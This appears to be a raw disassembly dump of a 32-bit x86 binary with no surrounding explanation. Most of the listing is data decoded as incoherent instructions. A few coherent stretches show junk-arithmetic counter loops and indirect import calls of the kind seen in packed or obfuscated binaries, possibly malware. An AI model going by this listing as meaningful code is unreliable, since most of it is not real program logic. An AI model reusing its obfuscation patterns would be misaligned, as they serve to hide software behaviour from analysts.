  411f39:	push   0xffffffab
  411f3b:	or     BYTE PTR [edi],0x33
  411f3e:	jb     0x411f6a
  411f40:	imul   ebp,DWORD PTR [edi+0x336223cb],0xfab7e448
  411f4a:	push   esi
  411f4b:	mov    dh,0x78
  411f4d:	push   0x75
  411f4f:	cmp    bl,BYTE PTR [ebx+0x5bd68553]
  411f55:	mov    edi,DWORD PTR [edx+edx*1+0x57]
  411f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f5a:	mov    cl,0x77
  411f5c:	imul   edx,DWORD PTR [ebp-0x1d93d44e],0x69ce0a41
  411f66:	fcom   DWORD PTR [ebx]
  411f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f69:	jns    0x411efc
  411f6b:	dec    ebp
  411f6c:	xchg   ebp,eax
  411f6d:	sub    BYTE PTR [ebp+0x53],dl
  411f70:	jno    0x411f49
  411f72:	jne    0x411f1e
  411f74:	or     DWORD PTR [ebx],ecx
  411f76:	cli    
  411f77:	std    
  411f78:	int    0x14
  411f7a:	sub    dh,bh
  411f7c:	and    DWORD PTR [ebp-0x55cbd0a6],esi
  411f82:	lea    edi,ds:0x8ea66acb
  411f88:	iret   
  411f89:	ret    0xc60b
  411f8c:	in     al,0xa2
  411f8e:	out    0xde,eax
  411f90:	call   0xbd3e:0xbf8bbb4f
  411f97:	stos   DWORD PTR es:[edi],eax
  411f98:	and    esi,DWORD PTR [ebx+0x6b]
  411f9b:	xlat   BYTE PTR ds:[ebx]
  411f9c:	mov    dh,0xda
  411f9e:	gs hlt 
  411fa0:	shl    BYTE PTR [ecx],0xf3
  411fa3:	pop    es
  411fa4:	aam    0xc5
  411fa6:	jecxz  0x411ff5
  411fa8:	es scas al,BYTE PTR es:[edi]
  411faa:	xor    ebx,esp
  411fac:	mov    ebx,0x962b7be8
  411fb1:	je     0x41201a
  411fb3:	outs   dx,BYTE PTR ds:[esi]
  411fb4:	nop
  411fb5:	and    eax,0x2b8f8e1c
  411fba:	shl    al,cl
  411fbc:	and    BYTE PTR [ecx],0x69
  411fbf:	rcr    ah,1
  411fc1:	jb     0x412024
  411fc3:	mov    ds:0x1579f9a5,eax
  411fc8:	adc    eax,0x6079fd63
  411fcd:	push   esp
  411fce:	in     al,dx
  411fcf:	or     BYTE PTR [ecx-0x47420603],ah
  411fd5:	xchg   ecx,eax
  411fd6:	jecxz  0x411fa2
  411fd8:	mov    dl,0x84
  411fda:	add    al,0xb
  411fdc:	mov    esp,0xe4f735a4
  411fe1:	pop    esi
  411fe2:	test   BYTE PTR [esi-0x4b6179f7],dl
  411fe8:	sbb    BYTE PTR [edx+0x6b3ae466],0x13
  411fef:	dec    edx
  411ff0:	pop    edx
  411ff2:	xchg   DWORD PTR ds:0xd54d4722,ebx
  411ff8:	pop    ds
  411ff9:	pop    edi
  411ffa:	imul   esi,DWORD PTR [eax],0x5b
  411ffd:	jns    0x41207d
  411fff:	imul   esp,DWORD PTR [ebp-0x763b48ee]
  412006:	or     eax,esp
  412008:	das    
  412009:	add    dl,bh
  41200b:	mov    ds:0x16c29ee7,eax
  412010:	popf   
  412011:	loopne 0x412071
  412013:	shr    cl,cl
  412015:	(bad)  
  412016:	sbb    bh,BYTE PTR [eax+0x6]
  412019:	sar    DWORD PTR ds:0x74b15098,cl
  41201f:	inc    ebx
  412020:	nop
  412021:	bound  ebp,QWORD PTR [eax]
  412023:	sub    ah,BYTE PTR [ebx]
  412025:	push   cs
  412026:	int3   
  412027:	popf   
  412028:	push   esp
  412029:	cdq    
  41202a:	xchg   ecx,eax
  41202b:	ficom  DWORD PTR [ebp-0x1649f793]
  412031:	in     eax,0x71
  412033:	xor    eax,0x2352aad3
  412038:	sub    BYTE PTR [ebx+0x78],cl
  41203b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41203c:	test   esp,edx
  41203e:	mul    bh
  412040:	test   al,0x15
  412042:	mov    al,ds:0x2e118478
  412047:	retf   0x1d2e
  41204a:	mov    ds:0x37af1ec8,eax
  41204f:	push   cs
  412050:	xor    DWORD PTR [esp+esi*2-0x2fc0a664],edi
  412057:	sub    al,0x1b
  412059:	push   edi
  41205a:	sub    DWORD PTR [edi-0x8],ecx
  41205d:	mov    cl,0xd0
  41205f:	call   0x538502b8
  412064:	mov    al,ds:0x9a36777a
  412069:	mov    esp,0x42dd7b08
  41206e:	inc    eax
  41206f:	add    BYTE PTR [ecx+0x55],0x91
  412073:	(bad)  
  412074:	neg    BYTE PTR [esi+0x1a6af9f4]
  41207a:	inc    esi
  41207b:	pop    esi
  41207c:	mov    al,0xb
  41207e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41207f:	pop    ebx
  412080:	cmp    ah,dl
  412082:	add    BYTE PTR [edx],ch
  412084:	push   ebx
  412085:	adc    dh,dl
  412087:	jae    0x412019
  412089:	fnstsw WORD PTR [ecx]
  41208b:	mov    DWORD PTR [ecx-0x1f3e252d],edx
  412091:	arpl   WORD PTR [eax],si
  412093:	mov    esi,0x72484e39
  412098:	mov    eax,0x4efe4041
  41209d:	in     al,dx
  41209e:	icebp  
  41209f:	dec    ebx
  4120a0:	mov    ds:0x9ce7c13a,eax
  4120a5:	or     edi,DWORD PTR [esi+0x17]
  4120a8:	popa   
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	jge    0x4120ff
  41216f:	and    eax,DWORD PTR [bp+0x5f]
  412173:	jo     0x4121e5
  412175:	mov    ecx,0x3170707e
  41217a:	add    ebx,DWORD PTR [ebx]
  41217c:	pusha  
  41217d:	cmp    al,0x4a
  41217f:	push   edi
  412180:	leave  
  412181:	mov    bh,0xa2
  412183:	dec    esi
  412184:	out    dx,eax
  412185:	mov    edx,0x5c206e08
  41218a:	jmp    0x9b9e2986
  41218f:	fimul  WORD PTR [ebp+0x1e8213ee]
  412195:	mov    eax,0x315d752c
  41219a:	xor    ah,BYTE PTR [edx]
  41219c:	adc    ch,BYTE PTR [edx+0x11]
  41219f:	xor    DWORD PTR [esi-0x77],edi
  4121a2:	inc    bh
  4121a4:	add    al,0x39
  4121a6:	add    al,0x81
  4121a8:	mov    dl,0x75
  4121aa:	test   al,0x41
  4121ac:	mov    cl,0xfd
  4121ae:	loop   0x412189
  4121b0:	sub    eax,0x5d2209cb
  4121b5:	icebp  
  4121b6:	(bad)  
  4121b7:	jecxz  0x412211
  4121b9:	xchg   edi,eax
  4121ba:	loopne 0x412158
  4121bc:	in     al,dx
  4121bd:	push   ecx
  4121be:	inc    edi
  4121bf:	add    DWORD PTR [edx],ecx
  4121c1:	or     DWORD PTR [ebx],ebx
  4121c3:	mov    DWORD PTR [eax+0x39],esi
  4121c6:	idiv   BYTE PTR [edx]
  4121c8:	je     0x412194
  4121ca:	pushf  
  4121cb:	cli    
  4121cc:	push   ebp
  4121cd:	push   esp
  4121ce:	(bad)  
  4121cf:	push   eax
  4121d0:	pushf  
  4121d1:	std    
  4121d2:	aaa    
  4121d3:	adc    cl,BYTE PTR [edx+eax*8]
  4121d6:	or     BYTE PTR [eax-0x56],cl
  4121d9:	scas   al,BYTE PTR es:[edi]
  4121da:	loopne 0x4121b0
  4121dc:	cmp    ch,BYTE PTR [eax+0x20]
  4121df:	jmp    0x15f09ee
  4121e4:	or     eax,0xd8245fc
  4121e9:	les    edx,FWORD PTR [ecx]
  4121eb:	fdivr  DWORD PTR es:[eax-0x3bf346c3]
  4121f2:	neg    BYTE PTR [edi+edi*1-0xe359764]
  4121f9:	cmp    edi,DWORD PTR [ecx-0x73]
  4121fc:	sbb    DWORD PTR [esi+0x45],ebp
  4121ff:	jmp    0xc19:0x4164a62b
  412206:	sub    DWORD PTR [edx+0x6a],esi
  412209:	jmp    0x54a5:0x4f19ae52
  412210:	sbb    eax,0xc11d6dc0
  412215:	sti    
  412216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412217:	in     al,dx
  412218:	mov    ch,0x54
  41221a:	imul   edx,DWORD PTR [edx-0x422c376f],0x8bcef038
  412224:	fsubr  DWORD PTR [edi]
  412226:	into   
  412227:	les    ebx,FWORD PTR [edi+0x2c]
  41222a:	jne    0x41228e
  41222c:	mov    ds:0x63f8694b,al
  412231:	hlt    
  412232:	pop    esi
  412233:	adc    BYTE PTR [ecx+0x2e2e06ce],bh
  412239:	jo     0x4121cc
  41223b:	xchg   edx,eax
  41223c:	jbe    0x412283
  41223e:	mov    ebx,0x7da3a11
  412243:	lods   al,BYTE PTR ds:[esi]
  412244:	sbb    al,BYTE PTR [esp+ecx*4+0x19545f9f]
  41224b:	xchg   ecx,eax
  41224c:	jmp    0x412218
  41224e:	sub    al,0x48
  412250:	repz push ebx
  412252:	add    WORD PTR [ecx],si
  412255:	mov    bh,0xe7
  412257:	cmp    bh,dh
  412259:	outs   dx,BYTE PTR ds:[esi]
  41225a:	or     BYTE PTR [ebp-0x40],al
  41225d:	in     al,dx
  41225e:	and    al,0x36
  412260:	cs xor al,0x7f
  412263:	sahf   
  412264:	daa    
  412265:	into   
  412266:	xchg   ebp,eax
  412267:	aaa    
  412268:	cli    
  412269:	(bad)  
  41226a:	(bad)  
  41226b:	jnp    0x4122de
  41226d:	push   edx
  41226e:	add    edx,DWORD PTR [eax-0x48]
  412271:	pop    eax
  412272:	sbb    DWORD PTR [ebx-0x1f114dd2],edx
  412278:	cmp    eax,0xd9f1d5c2
  41227d:	loope  0x4122c5
  41227f:	ins    BYTE PTR es:[edi],dx
  412280:	imul   edi,ecx,0x48
  412283:	pop    ebp
  412284:	daa    
  412285:	addr16 pop ebx
  412287:	lods   eax,DWORD PTR ds:[esi]
  412288:	rol    BYTE PTR [ecx+0x1a22353b],0x2a
  41228f:	dec    edx
  412290:	test   BYTE PTR [edi+0x472e2fcb],0xdb
  412297:	push   ebp
  412298:	fbstp  TBYTE PTR [ecx+0x27d44edb]
  41229e:	rcr    DWORD PTR [esi-0x66],cl
  4122a1:	lahf   
  4122a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122a3:	adc    ebx,ecx
  4122a5:	lds    esi,FWORD PTR [edi]
  4122a7:	inc    ebp
  4122a8:	xchg   edi,eax
  4122a9:	adc    dl,ah
  4122ab:	test   al,0x1a
  4122ad:	mov    cl,0x41
  4122af:	and    eax,0x5d715c0d
  4122b4:	jb     0x412309
  4122b6:	in     eax,0x77
  4122b8:	pop    ebp
  4122b9:	add    eax,0x3e4db8f3
  4122be:	mov    ds:0x2d7253a9,eax
  4122c3:	or     al,0x1b
  4122c5:	mov    bh,0x1c
  4122c7:	les    ebx,FWORD PTR [esp+edx*8-0x2600767a]
  4122ce:	mov    eax,0x9b6fe9db
  4122d3:	lods   eax,DWORD PTR ds:[esi]
  4122d4:	jle    0x4122ea
  4122d6:	jge    0x4122fd
  4122d8:	aas    
  4122d9:	jmp    0x412273
  4122db:	stc    
  4122dc:	xchg   ebp,edx
  4122de:	cmp    DWORD PTR [ebp+eax*1+0x508fd6b9],ebx
  4122e5:	das    
  4122e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122e7:	addr16 mov ds:0x7b17,al
  4122eb:	xchg   esp,eax
  4122ec:	in     eax,dx
  4122ed:	mov    bh,0x9a
  4122ef:	mov    ds:0x817b8ede,al
  4122f4:	inc    esi
  4122f5:	xchg   BYTE PTR [ecx+ebx*1-0x60],dh
  4122f9:	fnstsw WORD PTR [edx+ecx*8+0x51]
  4122fd:	ds daa 
  4122ff:	mov    ch,0x71
  412301:	(bad)  
  412302:	frstor [esi+0x59]
  412305:	sbb    BYTE PTR [edx],ch
  412307:	mov    ecx,0x6e5f6d1c
  41230c:	mov    al,ds:0x1b3820bb
  412311:	cmp    bl,BYTE PTR [ecx+0x4259f8d3]
  412317:	repz xor al,0x4b
  41231a:	sub    al,0x11
  41231c:	dec    edi
  41231d:	and    ebp,0x2e
  412320:	out    0xfd,al
  412322:	cmc    
  412323:	in     eax,0xbb
  412325:	adc    edi,DWORD PTR [esi+0x1fdfb8]
  41232b:	xchg   BYTE PTR ds:[edx+ecx*8-0x23],ah
  412330:	jl     0x41231e
  412332:	lahf   
  412333:	rol    DWORD PTR [ebx],cl
  412335:	aad    0x2
  412337:	aam    0xec
  412339:	mov    ebx,0xcdcef8db
  41233e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41233f:	inc    ebx
  412340:	daa    
  412341:	adc    ebx,DWORD PTR ds:0x8b46b5b6
  412347:	int3   
  412348:	sub    DWORD PTR [edx-0x610cad7f],0x7f30604d
  412352:	xlat   BYTE PTR ds:[ebx]
  412353:	inc    ebx
  412354:	mov    ds:0x2438af1d,eax
  412359:	clc    
  41235a:	imul   ebp,DWORD PTR [ecx-0x2e03c5ea],0x3fd7f412
  412364:	enter  0x13da,0x78
  412368:	imul   edx,DWORD PTR [ebp-0x2395f01b],0x18
  41236f:	cmp    cl,BYTE PTR [edx+0x4c0bf4c]
  412375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412376:	cld    
  412377:	lods   eax,DWORD PTR ds:[esi]
  412378:	sbb    BYTE PTR [edi-0x3e],ah
  41237b:	jmp    0x9820ebae
  412380:	pop    ebp
  412381:	mov    ds:0x6e6f7eaf,eax
  412386:	aas    
  412387:	mov    gs,ebp
  412389:	fcom   QWORD PTR [ebp-0x2c]
  41238c:	jae    0x4123ad
  41238e:	ficom  DWORD PTR [ecx-0x65]
  412391:	(bad)  
  412392:	cmp    al,0x47
  412394:	and    BYTE PTR [edi],0x58
  412397:	cvtdq2ps xmm6,XMMWORD PTR [ebp+ecx*8-0x6c]
  41239c:	inc    ebp
  41239d:	ret    0xac99
  4123a0:	ror    DWORD PTR [edi+0x45b1302d],0x21
  4123a7:	outs   dx,BYTE PTR ds:[esi]
  4123a8:	push   ds
  4123a9:	ins    DWORD PTR es:[edi],dx
  4123aa:	ds popf 
  4123ac:	int3   
  4123ad:	sbb    DWORD PTR [edi+0x4d266a6f],esp
  4123b3:	cmp    eax,0x6c3d31e6
  4123b8:	neg    esp
  4123ba:	dec    esp
  4123bb:	push   esi
  4123bc:	ins    BYTE PTR es:[edi],dx
  4123bd:	call   0xaded:0x1e0611f1
  4123c4:	adc    BYTE PTR [eax],dl
  4123c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c7:	test   eax,0x57ede13f
  4123cc:	jno    0x412359
  4123ce:	push   esp
  4123cf:	rol    BYTE PTR [edi],1
  4123d1:	sbb    eax,0xb0d29514
  4123d6:	ret    0x1dbf
  4123d9:	pextrw ebx,(bad),0xc5
  4123db:	sbb    cl,cl
  4123dd:	repnz pushf 
  4123df:	aad    0x18
  4123e1:	cld    
  4123e2:	sbb    eax,0xfd7663f3
  4123e7:	sub    al,0x5e
  4123e9:	xchg   BYTE PTR [edi],bl
  4123eb:	push   cs
  4123ec:	mov    ch,0x97
  4123ee:	sub    ebp,ebp
  4123f0:	xchg   edx,eax
  4123f1:	out    dx,eax
  4123f2:	xor    edi,DWORD PTR [edi]
  4123f4:	and    BYTE PTR [ebp+edx*1-0x33],0x75
  4123f9:	or     BYTE PTR [eax+0x24],ah
  4123fc:	scas   eax,DWORD PTR es:[edi]
  4123fd:	mov    ecx,0xf21291da
  412402:	lds    esp,FWORD PTR [ecx]
  412404:	sbb    DWORD PTR [ebx],eax
  412406:	repnz (bad) 
  412408:	adc    DWORD PTR [ecx-0x4a],esi
  41240b:	scas   eax,DWORD PTR es:[edi]
  41240c:	mov    ebx,0x1ebbc31c
  412411:	fwait
  412412:	inc    eax
  412413:	fsqrt  
  412415:	pop    ss
  412416:	shr    BYTE PTR [edi],cl
  412418:	aas    
  412419:	mov    ds:0x91303351,eax
  41241e:	shr    BYTE PTR [ecx+0x30b69496],1
  412424:	retf   
  412425:	mov    dl,0x0
  412427:	stos   DWORD PTR es:[edi],eax
  412428:	mov    ah,0xba
  41242a:	hlt    
  41242b:	sub    eax,0x7cd1c318
  412430:	imul   edx,DWORD PTR [edx+0x3f824da5],0xb8403beb
  41243a:	and    BYTE PTR [edx+0x57af820e],0x3
  412441:	retf   
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	push   eax
  41245e:	les    ebp,FWORD PTR ds:0x705c8f81
  412464:	jo     0x41241f
  412466:	jle    0x4124d8
  412468:	jo     0x412490
  41246a:	or     cl,dl
  41246c:	and    BYTE PTR [ebp+0x70842701],ah
  412472:	je     0x4124b1
  412474:	and    ah,ah
  412476:	and    BYTE PTR [ebp+0x2605b6b3],al
  41247c:	sub    bh,BYTE PTR [esi-0x4a]
  41247f:	stos   BYTE PTR es:[edi],al
  412480:	push   0xffffffdf
  412482:	ror    DWORD PTR [esi-0x28],cl
  412485:	cmp    BYTE PTR [ebx-0x54],al
  412488:	icebp  
  412489:	mov    DWORD PTR [esi+0x8],ecx
  41248c:	xor    dh,BYTE PTR [ecx-0x1d]
  41248f:	sub    BYTE PTR [ebp+0x64],cl
  412492:	jo     0x4124a3
  412494:	or     al,0xcc
  412496:	ror    DWORD PTR [edi],0x4c
  412499:	dec    esi
  41249a:	xor    BYTE PTR [eax+0x6e],0x5
  41249e:	pop    edi
  41249f:	adc    BYTE PTR [edx+edi*4-0x52e8d2c7],cl
  4124a6:	dec    ebp
  4124a7:	sbb    al,0xd5
  4124a9:	pop    edi
  4124aa:	test   DWORD PTR [esi],ebp
  4124ac:	add    ebx,DWORD PTR [ecx-0x4123cc8c]
  4124b2:	or     esp,ecx
  4124b4:	cmc    
  4124b5:	add    BYTE PTR [edx],0x96
  4124b8:	out    dx,al
  4124b9:	mov    edx,0x16c5b8e6
  4124be:	cmc    
  4124bf:	ins    BYTE PTR es:[edi],dx
  4124c0:	stos   BYTE PTR es:[edi],al
  4124c1:	push   edx
  4124c2:	fs push eax
  4124c4:	stc    
  4124c5:	add    DWORD PTR [edx],eax
  4124c7:	push   ds
  4124c8:	sub    al,0xa3
  4124ca:	pop    es
  4124cb:	je     0x412517
  4124cd:	(bad)  
  4124ce:	outs   dx,BYTE PTR ds:[esi]
  4124cf:	cli    
  4124d0:	icebp  
  4124d1:	inc    edx
  4124d2:	mov    WORD PTR [ecx+esi*8],ss
  4124d5:	loop   0x4124f1
  4124d7:	jns    0x412554
  4124d9:	push   ebx
  4124da:	rcl    DWORD PTR [esi],cl
  4124dc:	lods   al,BYTE PTR ds:[esi]
  4124dd:	mov    ecx,0xef93f112
  4124e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124e3:	cmp    ecx,edx
  4124e5:	(bad)  
  4124e6:	cwde   
  4124e7:	pusha  
  4124e8:	xchg   DWORD PTR gs:0x4ae8e49c,ecx
  4124ef:	jnp    0x41249e
  4124f1:	mov    eax,DWORD PTR [eax-0x4a]
  4124f4:	dec    eax
  4124f6:	(bad)  
  4124f7:	cld    
  4124f8:	cld    
  4124f9:	fsubr  DWORD PTR [esi]
  4124fb:	sbb    DWORD PTR [ebx+0x2dc83d5e],ebp
  412501:	sub    edi,esi
  412503:	xchg   esi,eax
  412505:	cdq    
  412506:	push   esi
  412507:	jnp    0x41257b
  412509:	je     0x41254b
  41250b:	clc    
  41250c:	retf   0x14b1
  41250f:	prefetch (bad)
  412510:	or     eax,0x13f977c0
  412515:	sub    esi,DWORD PTR [edi-0x3d]
  412518:	arpl   ax,di
  41251a:	adc    esp,DWORD PTR [ebx+0x361cd9e6]
  412520:	ret    
  412521:	mov    esp,ebp
  412523:	xor    ebx,edi
  412525:	sub    ecx,DWORD PTR [ebx-0x35]
  412528:	shl    DWORD PTR [ecx+0x73],1
  41252b:	jecxz  0x41257a
  41252d:	scas   eax,DWORD PTR es:[edi]
  41252e:	cdq    
  41252f:	or     edx,DWORD PTR [ebp-0x6c8226a5]
  412535:	shr    bl,cl
  412537:	adc    DWORD PTR [ecx+0x5b],esi
  41253a:	nop
  41253b:	cwde   
  41253c:	mov    eax,ds:0x45f4d3a6
  412541:	push   edx
  412542:	xlat   BYTE PTR fs:[ebx]
  412544:	mov    esi,0xdc588d6c
  412549:	fcmovnb st,st(2)
  41254b:	aas    
  41254c:	pop    esi
  41254d:	sub    BYTE PTR [ebp-0x3757da0f],bh
  412553:	add    eax,DWORD PTR [edx+0x6b39d995]
  412559:	jo     0x41251f
  41255b:	lods   eax,DWORD PTR ds:[esi]
  41255c:	mov    ch,0x0
  41255e:	sbb    DWORD PTR [esi],0x5607e2ed
  412564:	dec    ebx
  412565:	test   al,0x88
  412567:	dec    esp
  412568:	call   0x797e:0xb14d597b
  41256f:	mov    edx,0x3b696a47
  412574:	icebp  
  412575:	cmp    DWORD PTR [edi+0x4912daee],ebp
  41257b:	das    
  41257c:	cmp    cl,BYTE PTR [ebx+edx*8+0x713a1f6a]
  412583:	int    0x5d
  412585:	test   DWORD PTR [edx-0x6199d4f7],esi
  41258b:	jno    0x41256d
  41258d:	idiv   edi
  41258f:	ins    BYTE PTR es:[edi],dx
  412590:	loopne 0x41255e
  412592:	dec    esi
  412593:	(bad)  
  412594:	cmc    
  412595:	daa    
  412596:	inc    ebp
  412597:	dec    edx
  412598:	mov    ch,0x3c
  41259a:	(bad)  
  41259c:	and    eax,0x2e5bc8b2
  4125a1:	xabort 0x7a
  4125a4:	jle    0x412621
  4125a6:	rcr    BYTE PTR [esi-0x4a24ffb6],cl
  4125ac:	and    eax,0x6817e962
  4125b1:	pop    edx
  4125b2:	jmp    0xb8955196
  4125b7:	ret    0xb3c9
  4125ba:	sbb    cl,bh
  4125bc:	sub    ebx,ebx
  4125be:	xchg   edx,eax
  4125bf:	pop    ss
  4125c0:	call   0x1ff1:0xf783d174
  4125c7:	aaa    
  4125c8:	mov    DWORD PTR [esi-0x6cbd72d9],ebp
  4125ce:	(bad)  
  4125cf:	in     al,dx
  4125d0:	in     al,dx
  4125d1:	test   BYTE PTR [eax+0x24173d17],dh
  4125d7:	aaa    
  4125d8:	xor    al,0xe4
  4125da:	mov    bh,0x18
  4125dc:	push   edi
  4125dd:	sbb    al,0x64
  4125df:	add    BYTE PTR [ebx+0x4e],0x38
  4125e3:	icebp  
  4125e4:	or     ah,BYTE PTR [edx]
  4125e6:	sbb    ebx,DWORD PTR [edi-0x71]
  4125e9:	mov    al,ds:0x2607ec2c
  4125ee:	cli    
  4125ef:	scas   eax,DWORD PTR es:[edi]
  4125f0:	mov    dl,cl
  4125f2:	loopne 0x41264d
  4125f4:	jg     0x41258b
  4125f6:	xor    edi,eax
  4125f8:	in     eax,0xdf
  4125fa:	fdivr  DWORD PTR [eax+edx*4-0x54]
  4125fe:	in     eax,0xd1
  412600:	and    DWORD PTR [edi],eax
  412602:	std    
  412603:	sub    ch,0x0
  412606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412607:	xor    esi,ecx
  412609:	arpl   bp,ax
  41260b:	and    ebx,DWORD PTR [ecx+0x71]
  41260e:	cli    
  41260f:	into   
  412610:	mov    edi,0xca356287
  412615:	pop    esp
  412616:	mov    edx,0xc50a2496
  41261b:	push   0x45b43470
  412620:	jg     0x4125bc
  412622:	inc    ebp
  412623:	mov    ebp,0x236a913a
  412628:	call   0xb1f:0xcca3434c
  41262f:	ret    
  412630:	jecxz  0x412665
  412632:	jmp    0x412698
  412634:	std    
  412635:	repnz and edi,edx
  412638:	cmp    BYTE PTR [eax-0x6],ah
  41263b:	fsubr  QWORD PTR [esi+0x4394df4a]
  412641:	fcomp  DWORD PTR [eax+edi*4-0xdfe054f]
  412648:	mov    ebx,0xb05823b6
  41264d:	inc    esi
  41264e:	push   cs
  41264f:	xchg   esi,eax
  412650:	ja     0x412639
  412652:	out    dx,eax
  412653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412654:	call   FWORD PTR [edi+0x25]
  412657:	xlat   BYTE PTR ds:[ebx]
  412658:	add    al,0x71
  41265a:	or     bl,bl
  41265c:	push   es
  41265d:	jo     0x41266b
  41265f:	xor    eax,0x8066f05a
  412664:	(bad)  
  412665:	test   BYTE PTR [edx+eiz*1],bl
  412668:	xchg   ecx,eax
  412669:	loope  0x41261b
  41266b:	int3   
  41266c:	pusha  
  41266d:	(bad)  
  41266e:	imul   esp,esi,0xcb342104
  412674:	test   ah,ah
  412676:	xor    al,0x41
  412679:	daa    
  41267a:	sbb    ecx,edi
  41267c:	enter  0xf39f,0xc
  412680:	push   edx
  412681:	jle    0x4126ec
  412683:	inc    esi
  412684:	pushf  
  412685:	jno    0x41260d
  412687:	mov    ah,0x56
  412689:	jmp    0x864b:0x53a5f5c3
  412690:	mov    esi,0x99cf1fa3
  412695:	retf   
  412696:	sub    DWORD PTR [edi-0x12],eax
  412699:	cs loope 0x41264c
  41269c:	jbe    0x4126a9
  41269e:	test   eax,0x4c419a07
  4126a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126a4:	xlat   BYTE PTR ds:[ebx]
  4126a5:	adc    al,0x61
  4126a7:	dec    ecx
  4126a8:	lock daa 
  4126aa:	dec    ebp
  4126ab:	jmp    0x41263a
  4126ad:	arpl   si,si
  4126af:	sub    BYTE PTR [esi+ebx*1],cl
  4126b2:	popa   
  4126b3:	pop    eax
  4126b4:	adc    edi,DWORD PTR [ebp+0x2e]
  4126b7:	and    dl,BYTE PTR [edx]
  4126b9:	hlt    
  4126ba:	xchg   BYTE PTR [edx+0x128209c],dl
  4126c0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4126c2:	test   eax,0xf1950a36
  4126c7:	adc    dh,BYTE PTR [edi-0xe]
  4126ca:	in     al,0x63
  4126cc:	adc    BYTE PTR [ebx-0x2b],ch
  4126cf:	mov    ch,0x28
  4126d1:	jae    0x412688
  4126d3:	pusha  
  4126d4:	push   esi
  4126d5:	(bad)  
  4126d6:	aas    
  4126d7:	lahf   
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	push   cs
  4126da:	in     eax,dx
  4126db:	and    BYTE PTR [edi],0x11
  4126de:	push   eax
  4126df:	pop    es
  4126e0:	imul   eax,DWORD PTR [ecx+0x751b441e],0xc30cc823
  4126ea:	mov    ecx,0x2a7c2f0f
  4126ef:	or     DWORD PTR [edi+0x44],ebx
  4126f2:	loope  0x412674
  4126f4:	sbb    BYTE PTR [edx-0x6],bl
  4126f7:	jl     0x412714
  4126f9:	mov    eax,esi
  4126fb:	sub    BYTE PTR [ebx],dh
  4126fd:	jae    0x41275e
  4126ff:	js     0x412748
  412701:	jecxz  0x41273b
  412703:	mov    bh,0xc8
  412705:	in     eax,0x47
  412707:	(bad)  
  412708:	enter  0x160a,0x42
  41270c:	cmp    BYTE PTR ds:0x71f316fa,bl
  412712:	sub    al,0x9f
  412714:	jno    0x41273a
  412716:	sub    al,0x79
  412718:	adc    dl,dl
  41271a:	gs jl  0x412796
  41271d:	rol    al,1
  41271f:	add    DWORD PTR [esi],edx
  412721:	aad    0xc7
  412723:	cmp    dh,BYTE PTR [ebx-0x1d9ce14c]
  412729:	jmp    0x4cc2:0x31457071
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
  412744:	or     ecx,DWORD PTR ds:0x42fd76
  41274a:	inc    ecx
  41274b:	mov    DWORD PTR ds:0x42fd76,ecx
  412751:	cmp    DWORD PTR ds:0x42fd76,0x1c
  412758:	jae    0x41279b
  41275e:	cmp    DWORD PTR ds:0x42fd76,0x11
  412765:	jne    0x41277c
  41276b:	push   0x5b8f
  412770:	push   DWORD PTR [ebp-0x20]
  412773:	push   DWORD PTR [ebp-0x14]
  412776:	call   DWORD PTR ds:0x42e313
  41277c:	cmp    DWORD PTR ds:0x42fd76,0x10
